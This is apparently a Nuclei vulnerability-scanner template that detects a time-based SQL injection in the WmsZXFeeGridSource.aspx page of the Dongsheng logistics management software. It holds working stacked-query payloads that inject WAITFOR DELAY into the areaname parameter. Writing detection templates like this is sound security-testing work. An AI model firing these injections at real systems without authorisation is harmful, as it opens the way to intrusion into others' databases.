id: dongshengwuliu-WmsZXFeeGridSource_aspx-sql-time

info:
  name: 东胜物流管理软件 WmsZXFeeGridSource.aspx SQL延时注入漏洞
  author: dongshengwuliu
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /WMS_ZX/WmsZXFeeGridSource.aspx?read=areaname&areaname=-1%27;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /WMS_ZX/WmsZXFeeGridSource.aspx?read=areaname&areaname=-1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and